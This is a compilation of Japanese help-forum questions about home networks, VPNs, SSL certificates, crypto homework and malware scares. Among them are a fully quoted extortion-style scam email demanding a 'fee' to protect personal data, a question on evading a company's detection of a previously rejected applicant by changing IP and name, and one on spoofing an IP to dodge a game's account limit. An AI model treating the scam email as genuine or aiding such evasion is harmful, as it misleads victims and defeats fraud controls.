質問概要 会員制HP。簡易な方法で会員本人しかアクセスできないようにするにはどうしたらいい？ 詳細 会員制HPを作りたいが、会員が 「ログインIDとパスワードを教えてあげるから、このHP、見てごらんよ。」 などといって、他人に自分のログインID、パスワードを教えてしまったら 他人も見ることが可能になってしまいます。 しかし本人認証に指紋やら静脈やらの生体認証を使うには、認証に必要な装置を ユーザが持つか、ユーザに貸与する必要があります。 また、本人しか知りえない情報（本人、家族親族のプライベートや財産に関する情報（生年月日、名前、銀行口座番号、クレジットカード番号など）を ID,パスワードに採用したとしても、本人が覚悟の上で他人に教えたりすれば、意味はありません。 （また、クレジットカード番号は12ケタの番号ですから、言われなければクレジットカード番号とはわかりませんから ”俺、自分のクレジットカード番号を他人に教えても平気だよ”という会員もいるかもしれません。） たとえ、会員本人が自ら他人にログイン画面のURL、ログインID、パスワードを教えたとしても、 ●本人以外はログインできない方法、 ●絶対に不可能とまで言わなくとも、本人以外がログインすることが限りなく難しくなる方法 ●尚且つ、生体認証やトークンなどの機器を不要とする方法（機器不要といっても、WEB閲覧の為のパソコン、ガラケー、スマホは当然ユーザが所持していることを前提とします） （トークン＝例　一部のネット系銀行が預金者に渡している、液晶端末。1分ごとに切り替わる 取引パスワードが表示され、取引の最終段階で現時点でトークンに表示されているパスワードを入力することで 取引（口座からの金の出し入れ）が完了する） というのはありますか？ すでに確立された単一の方法でも、今までの技術・手法のいくつかを組み合わせる方法でも、どちらでも結構です。
ネット販売サイトでSSL証明書を利用しようと思っておりますが、 格安なものから結構な価格のものまでいろいろあるようです。 下記3つを検討しておりますが、 １．PositiveSSL（Comodo社）1200円/年 ２．RapidSSL （GeoTrust社）2980円前後/年 ３．クイックSSLプレミアム（GeoTrust社）12780円/年 大したサイトではないので、安くて良いかな？とは思っておりますが・・・ 安くてもちゃんと効果はあるのでしょうか？ この価格差は何が違うのでしょうか？ 高いほうがセキュリティ面で効果があるのでしょうか？ アドバイスをよろしくお願いいたします。
突然ですが、数日前から我が家の２台のＰＣから「みんなで助け合おう　初心者のfilemeker pro q＆a」が閲覧できなくなり、「現在お探しのページはございません」という、画面になります。私のネット環境が問題なのか？.........ご存知の方がいましたら教えて下さい。
某サイトのブログ主ですが、ブログ内にコメントが来て、その人の個人携帯アドレスが入力されております。（ニックネームでやりとりするブログです） あきらかに違反と思えるし、個人情報だと思います。危険すぎると思いますが、どうでしょうか？ その人は、何かで凄く悩んでいるような文章で、個人的に私、又は他の複数の誰かと携帯でのメールの やり取りを希望しているようです。（何かのサクラ？とも思えます） 個人情報が漏えいするのでは、と心配なので、今のところ、こちらからは反応出しておりません。 ブログやネットにお詳しい方、いらっしゃいましたらよろしくお願い申し上げます。
ADSL専用の回線ってあるの？
回線速度が遅いとマジストレスたまるね I7、4760Kメモリ１６ギガHDD1T＋外付けHDD1T+SSD150 グラGeForceGTX960電源800W ウィンドウズ8.1pro サブ機コアI5+中古ｐｃウィンドウズ7CPUI3 ノート（中古）タブレット新品最近購入 ADSLだけでこれだけ起動するのは無理がある？
今ま出ADSL１階からデスク３台ノート１台タブレット使用してました 電波が弱く限界が来たので解約しました今は家のネットつながっておりません ネットやるときはネットカフエなどでやっております パソコンが置物状態なので親機中継器購入考えていますプロパイダーに加入すれば ネットにつながりますか？端末機なども考えましたが規制があるらしくやめました あとはケーブルテレビも考えましたが微妙ですNTT工事光は開通まで時間がかかりすぎ 早くネット復活させたいじゃなきゃただの置物状態になってるので 素人なので分かりやすく回答おねがいします
先日、ネット検索していると、無料アプリセキュリティ、３６０securityがあったのですが…運営は中国の会社でしたが、安心できるセキュリティでしょうが?教えてください
西日本ですが近い将来ADSLがなくなるって本当？ 今ADSLなのに本当ならなくなるまでに光にするしかないのか
Windowsファイアーウォールの設定で、クライアントPCからHTTP(S)の通信を特定のIPにだけ許可する設定をしたいです。 例えばIPアドレス「11.22.33.44」のみにHTTP(S)を許可し、それ以外のサイトには接続しないようにしたいです。 調べてもIPアドレス指定で拒否をする設定しか見つけられず、自分で色々と試しても上手くいきませんでした。 クライアントPCはWindows7です。
ルーターや他いろいろ考えましたが 親に言って光ファイバの工事する許可をもらいましたw もちろん工事費は自分で払います それでも通信速度上がらないってことありますかね？
１階にモデム置いてるから 中継器だけで２階まで電波届きますかね やっぱ初心者はバッファローがいいのかな
教えてください！□に答えを書け。カンマ「,」が必要であれば書くこと。 1.Z*N={x|1≦x≦N－1, gcd(x,N)=1}、gcdとは最大公約数。 　　Z*7 ={1,2,3,4, □ } ２． 位数ordp(a)とは、素数p、a∈Z*p={1,2,..,p-1}に対し、 ax≡1 (mod p)となる最小の正整数x。 ord5(4) =□ ３．p=5、g=3、x=3から公開鍵(p,g,y)を作成する。 但し、y=(gx mod p) 。　y = □　　　　 次に、平文m=2から暗号文(c1,c2)を作成せよ。 　　但し、 r=2, c1=(gr mod p), c2=(myr mod p) 。 (c1,c2) =( □ )
ＣＢＣ-ＭＡＣの（Ｍ’，Ｔａｇ）を偽造する。空欄□にあてはまるメッセージを選択肢aからfの中から選べ。 という問題で答えはｄになるのですが解き方教えてください
カウンタモードで暗号化する。□に数字を入れよ。という問題何をどうすればいいのですか。 画像が答えです 条件 1.n=4 2.ctr=0001 3.平文M=(0001,1001,0101) 4.暗号化アルゴリズムEK: EK(a) = a+1 但し、 EK(1111) = 0000 （例） EK(1010) = 1010+1 = 1011
とあるネットショッピングのサイトのアカウントに不正アクセスされ、登録しているクレジットカードで買い物されてしまいました。 数日間気づかなかったのですが、そのサイトを利用しようとログインしようとした際、アカウントかパスワードに誤りがあるとのエラーメッセージが繰り返され、パスワードの変更手続きをせざるを得なくなり、登録しているメールアドレスの未読メールの中に家族全員身に覚えのない購入品の配送遅れを知られるメールを見つけ、発覚しました。 家族の一人の端末からは静脈認証でログイン出来たので、キャンセルし、とりあえず事無きを得ましたが、どこの誰の仕業か詳細が知りたくてたまりません。 この様な被害は犯人を運よく見つけ、明るみに出たとしても、後を絶たない事はわかっています。 ですが、このままだと釈然としません。 この様な状態で、相手をつきとめる事は可能でしょうか。 それと、この様な事は実質的な被害こそ免れたものの、被害届けを出すべきでしょうか。 初めての事なのでわかりません。 是非、皆様からのご教示を賜りたいです。
プログラマー歴3か月ですが、ずば抜けてできる人がいる一方 平均レベルにも満たない程度のあまり適性がありません。 プログラマーはSEに上がったとしても 派遣から能力が低いため一般企業の社員コースにはなれないと思われ、 仕事も50歳でなくなるような雰囲気の業界です。 能力的に頑張ればプログラマーでやっていけるみたいな状態ではありません。 そこでまだ年数がひくいのでネットワークエンジニアへ転職を考えています。 プログラマーより賃金がやや高くなり 労働需要もプログラマー・SEよりはよくなると聞いています。 プログラマーSEは残業40時間が当たり前で0時帰りも頻繁でした。 ネットワークエンジニアはどうなんでしょうか。アラフォーです。 50万もする機器を買って練習とか 能力の上がらない壁はあるんでしょうか
職場で、USBメモリの使用を禁止したいと考えています。 以下の2点についてアドバイスを頂けますでしょうか？。 現状のユーザの業務でUSBメモリ使用している場合、業務が継続するための 代案を悩んでいます。どういった代案が考えられますでしょうか？。 　例） 　・（社内）社内LAN経由でファイルを会社のノートPCに収める、ように業務を変更する 　・（社外）顧客とのデータの受け渡しはビジネス用のファイル共有サイトを使用する 　などを考えていますが、アドバイスを頂けますでしょうか。 またネットワークのセグメントが別のフロア（３F、４F）があるのですが、 両階間でデータの受け渡しを、やはりUSBメモリを使用しています。 ネットワークのセグメントが異なる場合の、データの連携方法でやはり USBメモリを使用しない、良い方法はありますでしょうか・・？。
表題の件、ＰＨＰの開発環境を作ろうと思い、 Win8.1内臓のハイパーＶを利用して、 仮想マシン上にＣｅｎｔＯＳ７をインストールしたのですが、 ゲストＯＳからインターネットに繋がらない＆ホストと通信ができないので困っています。 上記を解決するためにはどのようにすればよいでしょうか。 また、ネットワークの知識を補充するためにはどのような書籍を学べばよいでしょうか。 今後、サーバーや仮想化についてもある程度の基本的なところまでは理解できるようにしておきたいです。 よろしくお願いします。
２つ質問です。 質問への経緯がアホすぎるのですが、 不安で眠れません。お知恵をください。 ※警告マークがでるのはなぜか・・・ 会社で使用しているPCのログイン時刻を確認する為コントローラーパネルの 「イベントビュアー」で参照しました。 試しに削除操作をすると拒否する旨のメッセージがでます。 再度「イベントビュアー」を参照すると全てのイベントが警告マークに変わっています。 不正操作の対象となったのでしょうか ※ログイン履歴について・・・ 一般的な企業でのログイン管理はPC起動・終了時でしょうか、 それともログインがアクティブの場合を確認するのでしょうか [経緯] あまり会社としてよろしくない時間帯に 起動中かつスリープ状態のPCへ起動状態に。 ↓ ログイン時間を参照し、削除を試みる。 ↓ 操作拒否 ↓ 質問に至る 不正操作と起動状態にしたことで セキュリティーに 引っかかるのではないかと 不安な状態です。 会社それぞれではあると思いますが、 情報をください。
┏━━━━━━━━━━[インターネット]━━━━━━━┓ ┃　　　　　　　　　　　　　┃　　　　　　　　　　　┃ [AirStation#2]　　　　[AirStation#1]　　　　　　　[Aterm] (192.168.1.1)　　　　(192.168.0.1)　　　　　　　(192.168.2.1) ┃　　　　　　　　　　　　　┃　　　　　　　　　　　┃ [Linux#1]～～VPN#1～～[Win7]～～～VPN#2～～～[Linux#2] (192.168.1.2)　　　　(LAN192.168.0.2)　　　　　　(192.168.2.2) 　　　　　　　　　　　(VPN#1_192.168.1.3) 　　　　　　　　　　　(VPN#2_192.168.2.3) なお、 AirStation#1、AirStation#2、Atermはルーターである。 Linux#1とLinux#2は、RaspberryPi2で、Rasbianをインストール。 VPN#1とVPN#2は、Softetherで、SoftehterプロトコルのVPNである。 上記のネットワーク構成で、VPN経由で、Win7(192.168.2.3)から、Linux#2(192.168.2.2)に向けてPingを打っても到達不能と返されてしまいます。 しかし、Aterm(192.168.2.1)から、Linux#2(192.168.2.2)にPingを打つと100%返ってきます。 この場合、Win7(192.168.2.3)から、Linux#2(192.168.2.2)に向けてPingが通るようにするためにチェックすべき点はどんなことがあるでしょうか？ ちなみに、Win7(192.168.1.3)から、Linux#1(192.168.1.2)に向けての、VPN経由のPingは、100%返ってきます。
迷惑メールに添付されていたURLを寝ぼけてひらいてしまいました。 あわてて閉じましたすぐにこのようなメールがきました。 ↓ 警告｜個人情報保護及びウイルス駆除に関して、必ずお読みください。 申し込み頂いた、個人情報保護及びウイルス感染の解決に関する連絡です。 以下の支払いの手続きを行わない限り、あなたの個人情報はインターネット上で誰でも観覧できる状態が続きます。 悪質業者へあなたの全ての個人情報が渡った場合、マイナンバーを使用した二次被害が発生する可能性が非常に高いです。 あなたを救済するための唯一の措置として、次の通り免除申請を用意していますので、必ず行って下さい。 【免除申請の手続き】 免除申請の手続きは、次の通り費用が必要です。 ■代行費用 5,000円 ■支払期日 原則24時間以内 ※代行費用は本来は10,000円ですが、今から24時間以内に限り半分を免除します。 ※24時間経過後は、10,000円以上の費用が必要になります。 【免除申請の手続きを行う場合】 まず疎通確認を行いますので、このメールへそのまま返信して下さい。 追ってお支払方法など詳細をお知らせします。 お支払いを確認できた場合、免除申請の手続きを早急に行います。 これにより、あなたの個人情報を保護する（流出していた場合は抹消する）ことが可能です。 悪用等による二次被害を防ぐためにも、速やかに手続きを行って下さい。 ※回答を放置した場合、あるいは、虚偽申告が発覚した場合、あなたの財産に被害が及んでも一切の責任を持ちません。 ＝＝＝＝＝＝＝＝＝＝ 質問等あれば、本メールに直接返信して下さい。 2日以上経っても返信がない場合は、メールが届いていない可能性がありますので、再度返信をお願いします。 ◇注意事項 ・事前に指定したメールアドレスからの受信のみ許可しています。 ・絵文字やデコメなどの装飾メールは受信できません。 ・HTMLメールはテキストメールに変換してお送り下さい。 ・添付ファイルは受信できません どうしたらよいでしょうか(;-;)？至急おしえてください。よろしくお願いいたします
VRRPにおけるNATテーブル同期について 現在、LinuxOSにてルーターを作成しVRRPによる冗長化を行っているのですが 主系から待機系に切り替えを行った際にNATテーブルが消失してしまいセッションが途絶えてしまいます。 セッションが継続できるようNATテーブルを主系と待機系で定期的に同期させるいい案はないのでしょうか よろしくお願いします。
ファイルメーカーを管理していた人が、倒れてしまい、業務に支障がでているんですが、 パスワードのリセット方法がわかる方がいらっしゃいましたら、助けてください。 残ったメンバーは、ファイルメーカー初心者ばかりです なかなか難しいことだとは、わかりますが、どうか助けてください。
暗号解読について、以前質問して、 スーパーコンピュータならＡＥＳもそれ以外も1週間あれば解読できます。 個人レベルでは何やっても無駄です。 と教えていただきました。 次の疑問ですが、 AES、鍵の長さ256ビット、Camellia、鍵の長さ256ビット で、2段階の暗号化をした場合の解読時間は 2週間になるのでしょうか？ それとも、 1週間*2＾256　時間 くらいかかると計算するべきなのでしょうか？ よろしくお願いします。
ここ最近なんですが、お気に入りの中からフォルダを削除しようとしても出来なくなりました。 ほぼ全てです（お気に入りがあまりに多いので全部を試みてはいません）。 で、それらのフォルダのプロパティを開き、セキュリティを見ると、 アカウントのところのトップに「system」とだけ、見知らぬアカウントらしきものが 入っているのです。その「system」ってのがアクセス権を持っているのでしょうか？ ちなみに、新たに「お気に入り」に何かを入れようとすると、「アクセスを拒否」と 表示され出来ません。 「system」が何か？ 「system」が邪魔をしているのなら削除したいのです。 解る方、教えて下さい。 ・・・osはwindows7で、IEの初期化、データ復元などは試行済みです・・・。
その場合、何もスマホを操作しなくても危険は有るのですか？ウィルス マルウェア 情報漏洩など？ 勿論、その電波でインターネットなどやる事は危険なのですよね？ 教えて下さい。
iTunes75ポイントで、一曲ゲットというサイトを見ていたのですが いきなり、画面にお使いのiPadにウィルスが確認されました という表示が出ました これって、本当ですか？
XcodeGhostで作成された中国製アプリがアップルサイトでリリースされた問題ですが、日本ユーザに影響はありますか？ ↓ソース XcodeGhostで作成されたアプリがアップルサイトでリリースされた問題 セキュリティー研究者、クロード・シャオ氏は18日の同社ウェブサイトへの投稿で「XcodeGhostは非常に有害で危険なマルウエアであり、アップルのコード審査をかいくぐり、iOSのエコシステムに前例のない攻撃を仕掛けている」と述べ、犯罪者やスパイがマルウエアを使用してiOSを搭載した端末にアクセスする可能性を指摘した。 http://jp.wsj.com/articles/SB1183185895633050339 …
パケットを解析するツールでモニターしてみたら、ルーターで許可していないはずなのに、lan 内のコンピューターに世界から syk-flood らしき攻撃が来ています。 lan 内のコンピューターは、外部からは見えないし、ウェブサーバーの80ポートなどに自分から要求しなければ通信が始まらないはずのなのに、どうやってアクセスしているのか非常に不思議です。
マイナンバーのスタートに伴い、給与計算を委託している企業に「セキュリティ対策の取り組みについての質問」をしたいと考えています。 そこで、金融機関向けのセキュリティ対策の質問項目を参考にしたいのですが、ひな形となる質問一覧等、どなたかご存知の方がいましたら、サイト等を教えていただけないでしょうか。 宜しくお願いいたします
以前、IPカメラの映像を外出先からスマホで見ることができず質問させてもらいましたが、ポートの開放をしなければならないと教えていただきました。そこでいろいろ調べていたのですが、ポートを開放すると危険だというのを知ってどうしようが迷っています。しかし、ポートの開放をしなければIPカメラを見ることができないんですよね？開放しても大丈夫でしょうか？ よろしくお願いします。
XP、Win7の両方に、同じユーザーアカウント、パスワード設定にしています。 Cドライブに共有フォルダを作成し、ユーザーの読み取り/書き込み設定をしています。 コントロールパネルから共有の詳細設定の変更もしています。 ※ホームグループの参加設定はしていません。 ネットワークセキュリティ：LAN Manager 認証レベル は[LMとNTLMを送信する]にしています。 設定後は、開くことができます。 しかし、次の日に電源を入れ、開くとアクセスできません。 もう一度、LAN Manager 認証レベル を[LMとNTLMを送信する]に選択し、適応、OKで再起動すると開きます。 解決方法を教えて下さい。
BUFFALO 4GRV2の設定画面(パスワードを入力する)の出し方がわかりません。Wii Uです。インターネットは繋がります。192.…を入力して検索しても設定画面が出てきません。buffalo.setupでやっても同じです。 やり方を教えてください。
長文失礼致します。あるIT関連専門業者に依ってVirus感染させられました。きっかけはAndroid 端末の電話帳をiphoneにコピーすると云う単純な作業でしたが、３時間経過しても業務を完了出来なかったのみならず、５００件余りの電話帳データ殆どを消滅＆流失させられました。問題はそれのみに関わらず全てがgoogleのAccountに関連付けしていた為、２～３日後にはスマホは勿論PCも電源が入るのみでwindows7自体が起動できませんでした。作業開始直後「FileにLockが掛かって開けないとか、拡張子が変わってしまった」との呟きがーー。帰宅直後完全スキャン(kaspersky2015の最新定義File)をしたのですが、なにも検出出来ませんでした。 その内PCの動作がどんどん不安定、PWは改ざんされる、キーロネガー？によって意図しないサイトに誘導される、.exeの実行FileはMailerのみ立ち上げただけでした。最初の時点で作業員にData流失の事実を認めさせ証拠となる念書を書かせましたが、その後の業者の対応が余りにも不誠実で提訴も視野に入れています。そもそも彼らの主張は「赤外線PortやMicroSDカードを使って電話帳のコピーを試みた 」とのことですがiphoneには赤外線Portなどありません。PCを経由しなければ出来ない筈です。そのPCがVirusに感染していたらーーー？？明確な説明責任を果たそうともせず、ひたすら逃げ回っているのが現状です。 後日、判明したことだが通常のセキュリティSoftでは感知出来ないVirusだったようで、kaspersky社のVirus Removal Toolによってようやく駆除、ドライブをフォーマットして当時の不安定な状況をAcronis True Imageで再現出来ましたが、証拠保全の為なるべくPCをいじりたく有りませんし、フォーマットした以上Virusの痕跡は残ってないでしょう。唯一の手がかりはkaspersky社のVirus履歴⇒これは同社に提出すれば解析結果を提出してくれるものなのでしょうか？出来ればIT業者の私へのAccessログも欲しいのですが、技術的に可能なのでしょうか・因みに同社の日本Support Centerに打診してみたのですが、余り色よい返事は得られませんでした。やはりロシアの研究所に直訴しなければ難しいので しょうか？そもそもVirus Removal Toolによって削除された履歴は残っていなかったような気がするのですがーー。 現在はwindows10 64bitのPCを新規購入、関連Softや逸失利益、PTSD（ストレス性障害）に陥った 程の物心両面のDamage、業者の不誠実な対応に怒りを禁じ得ません。断固法的鉄槌を下して遣りたいのです。どうか皆様の叡智をお借りしてより明確な証拠（念書、破壊されたスマホ、PC、証人等物証は沢山有りますが）が欲しいのです。 どうか宜しくお願い致します。
今回windows8のPCを新しく購入しました。 前のPC（win7）ではネットワーク上の共有フォルダを使用して、周りのPCとデータをシェアしていました。 同じように新しいPCでもネットワーク上の共有フォルダを使用しようと思ったのですが、書き込みが出来ません。 色々とネットで調べて試してみましたが、該当する答えがなく困っています・・・。 【現状況】 ・「ネットワーク」の、新PCのフォルダにアクセスはできるが、データを放り込めない。 　「この操作を実行するアクセス許可が必要です」とエラーが出る。 ・プロパティ→セキュリティ→Users→[アクセス許可]詳細設定→[所有者]変更 　「新しい所有者を設定できません」とアクセス拒否される。 ・「ネットワーク」には、他のPCの共有フォルダが表示され、アクセスできます。 　こちらはデータを放り込む事が可能。 何が原因なのでしょうか・・・ わかる方いらっしゃったら教えてください＞＜！
■環境 ・ルータ接続PC2台 ・OSは何れもWin7 ・ルータはバッファロー ・ルータランプはそれぞれ正常点灯 ・デフォルトゲートウェイは162.168.11.1 ■不具合 ・今朝起きたら、ルータ接続PCの内1台のみネット接続不可 ・問題のPCから162.168.11.1へはアクセス不可 ■試したこと ・ルータ及びPC再起動 ・デバイスマネージャよりネットワークアダプタ削除後、再起動 ・ipconfig ・ipconfig /allcompartments /all ・route print -4 ■意味が良くわからないまま試したこと ・route delete 0.0.0.0 mask 0.0.0.0 ・route add 0.0.0.0 mask 0.0.0.0 162.168.11.1 ■質問1 「ipconfig」の「Tunnel adapter」が、「メディアは接続されていません」となるのは問題ない？ ■質問2 「ipconfig」の「自動構成 IPv4 アドレス」が「169.254.75.175」となっていて、デフォルトゲートウェイが「0.0.0.0」となっているのは問題ない？ ・「自動構成 IPv4 アドレス」って何？ ・これが原因？ ■質問3 「route print -4」の「ネットワーク宛先」と「ネットマスク」が「0.0.0.0」で、「インターフェイス」が「192.254.75.175」なのは問題ない？ ・「インターフェイス」を「192.168.11.1」へ変更すれば良い？ ・どうやって？ ■質問4 「route print -4」の「ネットワーク宛先」に下記アドレスがあるのは正常な状態？ ・「127.0.0.1」 ・「169.254.0.0」 ・「224.0.0.0」 ■質問5 「route print -4」の「ネットワーク宛先」に「255.255.255.255」が二つあるのは正常な状態？ ・「インターフェイス」はそれぞれ「127.0.0.1」と「169.254.75.175」
インターネットに接続していると時折、ネット接続が一瞬だけ途切れる事があります。 本当に一瞬で１秒とかそんなレベルです。その後は手動で何かする必要もなく正常に繋がります。 また切れた瞬間、タスクバー？を見たら画像のようにアイコンの一つにバツ印が付いていました。 それはスグに消えてしまってキャプチャ出来なかったので、画像のバツ印アイコンは手動でネット接続を切った時にキャプチャしたものです。 ネットゲームをしている時に接続が切れると一瞬でも接続をし直さないといけなくなるので困っています。 ネット接続の再接続、PCの再起動は試しましたが治りません。 一応自分としては他の理由として ・家族でそれぞれPCを持っているので無線LANに接続する機器が多すぎる ・機器の１つが無線LANから大分離れたところにあるので負担をかけている ・停電で無線LANが壊れてしまった などが思い当たるのですが、本当の理由はなんなのでしょうか？
昨日のことです..... （今は表示されませんが。） スマホを操作していたら画像のような英語の文章が出てきました..... これとあと一種類別のものがあるんですが。 これがなにかわかりません.....英語も到底読めませんし....唯一docomoが読めます.....(笑) なにかウイルスに感染しているのか心配です。 一緒のことがあるやこれがどういう意味なのかわかる方はコメントお願いします。 これが表示された後安心スキャンで予期せぬエラーが発生しましたと表示されてこれとなにか関係があるのかそこも知っている方はお願いします.....
中国製品であるレノボのPCがセキュリティーホールをインストールされた状態で出荷されていたとのことですが、なぜ？こういった問題が発生するのでしょうか？　 以下引用 http://www3.nhk.or.jp/news/html/20150820/k100101 … このソフトは、利用者がパソコンをどのように使っているかを知るために、出荷時にレノボが独自に組み込んでいたもので、システムの情報を自社のサーバーに自動的に送信するよう設定されていたということです。　しかし、レノボによりますと、ことしの春、このソフトに欠陥が見つかり、悪用されると最悪の場合、コンピューターウイルスに感染したり、インターネットを通じて勝手に遠隔操作されたりするおそれがあることが分かりました。 ------------------------------------
マイナンバーでの安全対策の項目で、 d. 情報漏えい等の防止 特定個人情報等をインターネット等により外部に送信する場合、通信 経路における情報漏えい等を防止するための措置を講ずる。 がありますが、当然、対策としては、暗号化ということになるかと思います。 質問は １．採用する暗号化アルゴリズムとして適当なものは何でしょうか？ ２．多重暗号化するときの暗号化の回数は何回くらいが適当でしょうか・
最近、職場のネットセキュリティがかわり、職場では以下の５つがすべて可能です。 (1) 一般的なWebブラウズ (2) メール送受信（Becky!でniftyアカウント） (3) メール送受信（Becky!で会社アカウント） (4) クラウド上のファイルサーバーへのアクセス (5) グループウエアへのアクセス 同一ノートPCで、職場と自宅を持ち運んでいる前提として、 自宅でも、(3)～(5)はVPNにさえつなげば可能です。 ただし、VPNはWin標準でなく、Cisco AnyConnectという接続ソフトを使って。 そこで質問ですが、自宅でVPNつなぎっぱなしでも、(1)(2)ができるようにはならないでしょうか。 試してませんが、(1)は、プロキシサーバを設定すればできるらしいですが、 メールに至っては、VPN接続中＝niftyが送受信できず、 一方VPN解除中は職場アカウントが送受信できず。 要はこまめにVPNのON/OFFをしなければなりません。 それがセキュリティというものなのだから、という話なら あきらめざるを得ませんが・・・もう少し便利にならないかなと思うのですが。
取引先に渡したいデータがあり、FTPでアップし、以下のようなURLをメールで伝えましたが、 先方のセキュリティ設定が強いためダウンロードできなかったそうです。 http://abc.com/test.zip データ渡し用のHTMLを作り 以下の様な形にして先方にブラウザからのダウンロードならできる可能性はあるでしょうか？ <a href="http://abc.com/test.zip">こちらをクリックしてダウンロードしてください。</a> どちらもファイルの置き場所は同じですが、メール本文のURLかHTMLかで違いがあるのでしょうか？ あまり気軽に頼める相手ではないため、極力事前に調べた上でお願いは最小限にしたいです。 HTML(http)経由で渡すのがダメであれば、データを渡す方法として他に何かありますか？
ウイルスバスタークラウドを平成２５年５月に購入し、ｗｉｎｄｏｗｓ８．１のパソコンにインストールして今まで使用していました。最近、プログラムのアップデートメッセージが出たもののアップデートが出来ず、解決方法の一つとしてプログラムの再インストールを行いました。しかしながら、再インストールしたところ、プログラム互換性アシストと表示され、インストールが出来なくなりました。 解決方法を教えて下さい。
スマホのブラウザであるサイトを閲覧しようとしたらセキュリティ警告が出るようになりました。内容は「セキュリティ証明書の名前とサイト名が一致しません」と言う内容でした。 なぜ急に出る ようになったんでしょうか？Chromeで同じサイトを閲覧しても問題なくみれます。 スマホの初期に入っているブラウザアプリで閲覧することは、もう無理なのでしょうか？
社内で情報セキュリティのテストの実施を考えています。 以下のような項目を考えています。 　・見に覚えが無い件名のメールは開かない 　・PCは社外に持ち出さない 　・USBメモリを使わない 　など こういったテストのサンプルを探していますが、 ネットで公開などはされているのでしょうか？。 もしあれば教えて頂けますでしょうか。 よろしくお願いします。
先日、会社のパソコンでヤフーメールの受信箱を見てしまいました。メールの送受信などはしておらず、ログインしただけです。 こういう場合、過去のメール（会社では送受信していない家で送受信した送受信箱に入っているメール）も会社側が接続ログを取っている場合は把握されてしまうのでしょうか？ 心配で見られたくないメールはゴミ箱へ移動し、ゴミ箱からも削除しました。パスワードも変更いたしました。 こちらで調べさせていただいたらヤフーメールは平文？？とかSSLに対応していない？？などの記載があり、パソコンに疎いため良く分かりませんでした。 どなたかご教示いただけましたら幸いです。
会社のパソコンでヤフーメールにログインしてしまいました。個々をメールは開いたり送受信はしていません。メール受信ボックスを開いただけです。 会社のシステム部に監視されたり内容を見られないか心配だったので、見られたくないメールの削除やパスワードは変更したのてすが、会社がログを取ってる場合、ヤフーメールの受信箱は閲覧されたりしてしまうのでしょうか？
中古(ジャンク)で購入してOSが入ってないので純正のXPHEを入れたのですが、 どうにもドライバーが富士通のHPには見当たりません、 デバイスマネージャを開くと、その他デバイスのところで、 ・ビデオコントローラ ・ビデオコントローラ（VGA互換） ・不明なデバイス 　↑Intel(R)82801 FBM LPC Interface Controller-264 ・不明なデバイス 　↑Microsoft ACPI-Compliant System がありました、 これらのドライバーをどこかﾀﾞｳﾝﾛｰﾄﾞできるHPはありませんか？ ↓一応PCスペックです。 FMV-C8220 CPU:Pentium（R） M 740（1.73GHz） メモリ：１G HDD：40G ドライブ：DVD
なにかしら、プログラムをインストールしようとすると、「このプログラムをインストールするには管理者権限が必要です」となってできません。　標準ユーザーから管理者へと変更したのですが、それでもインストールできず、さっきのメッセージがでてきます。　どうしたらよいでしょうか？
２ちゃんねるに書き込まれた記事が、IPアドレスからiPhoneの所有者を特定できるでしょうか？　Aさんが、２ちゃんねるに書き込まれた中傷記事に対して警察に被害届を出しました。警察は、IPアドレスからどのiPhoneから書き込まれたかが特定できたといって、Bさんを事情聴取しました。Bさんは身に覚えがないということです。どう思われますか？　特定なんかできないと思うのですが。
IPアドレスの変更はどこまで把握されるのでしょうか？ 某ヤフーが提供するサービスに申込をしたいのですが、以前に審査に通過しなかった経緯がございます。この度引っ越しをしたので、異なるIPアドレスと名義で再度申込をしようと考えておりますが、このような場合、どこまで完璧に変更をすれば、ヤフー側は同一人物と判断することができなくなるのでしょうか？ 【既存の環境：旧住所プロバイダ＋無線ルータA】 ▼考えられる変更のパターン ①：新住所プロバイダ＋既存無線ルータA ②：新住所プロバイダ＋新無線ルータB 自分でIPアドレスチェックをしたところ、①の設定でも既存の環境とは異なるIPアドレスになっていることは確認できました。ただ私は専門家ではないので、これ以上のことはわかりません。どなたかご教授頂ければ幸いです。
私の会社の管理部門から、ウィルス対策としてoutlookメールの閲覧ウィンドを デフォルトで表示しないように・・・と社員に指示がありました。 ウィルス対策で不用意にメール開封しないためと言え、これでは仕事がまわりません。 閲覧ウィンドを表示しながらも、他のメールをクリックしても、それまでのメールが開封されない方法（設定）はないものでしょうか？ お詳しい方、おしえてください。 よろしくお願いします。
早速なのですが FMV-C8220 CPU:Pentium（R） M 740（1.73GHz） メモリ：１G HDD：40G ドライブ：DVD と言うスペックのノートを中古(ジャンク)で購入しました、 OSは入ってなかったので入れようと思ったのですが、 FMVのロゴの後黒い画面のまま何も表示されません、 このような症状の場合どうすればいいでしょうか？ (BIOSは正常に動いてました、起動の順番もDVDを最優先に してあります)
自宅PC Windows(IP : xx.xx.xx.xx) | インターネット | ルータ WAN : yy.yy.yy.yy GW : 10.0.0.1 | YAMAHA RTX 1000 WAN：10.0.0.20 LAN : 192.168.0.1 | サーバ : 192.168.0.2 上記のような環境でVPNを利用して自宅からサーバへアクセスしたいのですが、どのようにRTX1000を設定したら良いでしょうか？あるいは参考になるconfig等ありましたら教えて頂けますでしょうか？ ルータは既存のもので設定済みです。 よろしくお願いします。
弟と同じネット回線を共有しています。 最近弟が自分がしていたゲームに興味を持ち、遊び始めました。 しかしそのゲームは同じネット回線からは１つのアカウントでしか プレイすることが出来ません。そこで自分がIPアドレスを偽装して 二人で同じ時間帯に遊べるようにしようと思ったのですが、 なぜか同じネット回線からアクセスしていることが分かってしまうようです。 使った串は接続元が分からなくなる匿名性の高い串です。 いったいなぜ分かるのでしょうか？また解決策はありますか？
会社のパソコンでフリーメールを使用した際、送受信の内容が会社にばれてしまうことがあるということをこちらで教えていただき知ったのですが、会社のパソコンでは送受信していない過去のメール(会社では開いたことのないメール)の受信箱や送信箱も見られてしまう可能性はあるのでしょうか？社内で送受信してしまった内容が会社に知られてしまうことは自分が悪いので納得出来るのですが、万が一会社に過去のメールの内容まで筒抜けになってしまうのであれば恐ろしいです。 自分の浅はかな行動は反省しております。 どなたかシステム関係に詳しい方、ご教示いただけましたら幸いです。
これがよくわからないのですが、 戸建向けは一戸建てにて回線を専有して使う、 マンションタイプというのはなんでしょうか？ イメージとしてはマンションやアパート側が光回線を引いてあり、 そこから各部屋に個別に線を引くという感じでしょうか？ もしアパートが光というものに対応していない場合 もし引こうとするならばアパートであっても戸建向けをひくことになるということなのでしょうか？
IPの勉強をしています。 参考書に、「ルータはルーティングに使われるルート情報をルーティングテーブルなどに保存します。」 と、出ていました。 ルーティングテーブルなど、ということは、ルーティングテーブル以外でもどこかに保存されるのだと思うのですが、 どこに保存されるのかが書いておらず、調べてもわかりませんでした。 ルーティングテーブル以外ではどこに保存されますか？
